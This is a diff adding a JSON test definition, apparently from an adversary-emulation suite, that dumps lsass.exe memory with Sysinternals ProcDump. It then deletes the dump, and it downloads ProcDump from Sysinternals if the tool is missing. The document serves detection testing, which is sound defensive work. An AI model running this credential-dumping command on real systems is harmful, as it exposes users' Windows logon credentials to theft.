@@ -1,0 +1,111 @@
+{
+  "id": "0be2230c-9ab3-4ac2-8826-3199b9a0ebf8",
+  "name": "Dump LSASS.exe Memory using ProcDump",
+  "description": "The memory of lsass.exe is often dumped for offline credential theft attacks. This can be achieved with Sysinternals\nProcDump.\n\nUpon successful execution, you should see the following file created c:\\windows\\temp\\lsass_dump.dmp.\n\nIf you see a message saying \"procdump.exe is not recognized as an internal or external command\", try using the  get-prereq_commands to download and install the ProcDump tool first.\n",
+  "platforms": [
+    "windows"
+  ],
+  "steps": [
+    {
+      "id": "e31cb85c-8809-4b83-b234-d029658f2ed8",
+      "type": "execute-command",
+      "data": {
+        "command": "\"#{procdump_exe}\" -accepteula -ma lsass.exe #{output_file}\n",
+        "command_type": "command_prompt"
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "bce2a306-ec32-4a3a-b797-1c657ffa7bd0",
+      "type": "execute-command",
+      "data": {
+        "command": "del \"#{output_file}\" \u003enul 2\u003e nul\n",
+        "command_type": "command_prompt"
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "5b3e1f85-bd8b-4fea-9cc9-d1236e4f294d",
+      "name": "Check dependency 1/1",
+      "description": "ProcDump tool from Sysinternals must exist on disk at specified location (#{procdump_exe})\n",
+      "type": "execute-command",
+      "data": {
+        "command": "if (Test-Path \"#{procdump_exe}\") {exit 0} else {exit 1}\n",
+        "command_type": ""
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "0508ffe0-b8b2-4e22-a2d3-ae6c0ce70bc5",
+      "name": "Resolve dependency 1/1",
+      "description": "ProcDump tool from Sysinternals must exist on disk at specified location (#{procdump_exe})\n",
+      "type": "execute-command",
+      "data": {
+        "command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nNew-Item -Type Directory \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\nInvoke-WebRequest \"https://download.sysinternals.com/files/Procdump.zip\" -OutFile \"PathToAtomicsFolder\\..\\ExternalPayloads\\Procdump.zip\"\nExpand-Archive \"PathToAtomicsFolder\\..\\ExternalPayloads\\Procdump.zip\" \"PathToAtomicsFolder\\..\\ExternalPayloads\\Procdump\" -Force\nNew-Item -ItemType Directory (Split-Path \"#{procdump_exe}\") -Force | Out-Null\nCopy-Item \"PathToAtomicsFolder\\..\\ExternalPayloads\\Procdump\\Procdump.exe\" \"#{procdump_exe}\" -Force\n",
+        "command_type": ""
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "9657120c-3745-449e-99a6-22db576bc7ff",
+      "name": "Re-check dependency 1/1",
+      "description": "ProcDump tool from Sysinternals must exist on disk at specified location (#{procdump_exe})\n",
+      "type": "execute-command",
+      "data": {
+        "command": "if (Test-Path \"#{procdump_exe}\") {exit 0} else {exit 1}\n",
+        "command_type": ""
+      },
+      "elevation_required": false
+    }
+  ],
+  "flows": [
+    {
+      "s": "e31cb85c-8809-4b83-b234-d029658f2ed8",
+      "p": "on-success",
+      "o": "bce2a306-ec32-4a3a-b797-1c657ffa7bd0"
+    },
+    {
+      "s": "e31cb85c-8809-4b83-b234-d029658f2ed8",
+      "p": "on-failure",
+      "o": "bce2a306-ec32-4a3a-b797-1c657ffa7bd0"
+    },
+    {
+      "s": "5b3e1f85-bd8b-4fea-9cc9-d1236e4f294d",
+      "p": "on-success",
+      "o": "e31cb85c-8809-4b83-b234-d029658f2ed8"
+    },
+    {
+      "s": "5b3e1f85-bd8b-4fea-9cc9-d1236e4f294d",
+      "p": "on-failure",
+      "o": "0508ffe0-b8b2-4e22-a2d3-ae6c0ce70bc5"
+    },
+    {
+      "s": "0508ffe0-b8b2-4e22-a2d3-ae6c0ce70bc5",
+      "p": "on-success",
+      "o": "9657120c-3745-449e-99a6-22db576bc7ff"
+    },
+    {
+      "s": "9657120c-3745-449e-99a6-22db576bc7ff",
+      "p": "on-failure",
+      "o": "e31cb85c-8809-4b83-b234-d029658f2ed8"
+    }
+  ],
+  "tags": [
+    "T1003.001",
+    "atomic-red-team"
+  ],
+  "input_arguments": [
+    {
+      "name": "output_file",
+      "type": "path",
+      "description": "Path where resulting dump should be placed",
+      "value": "C:\\Windows\\Temp\\lsass_dump.dmp"
+    },
+    {
+      "name": "procdump_exe",
+      "type": "path",
+      "description": "Path of Procdump executable",
+      "value": "PathToAtomicsFolder\\..\\ExternalPayloads\\procdump.exe"
+    }
+  ]
+}
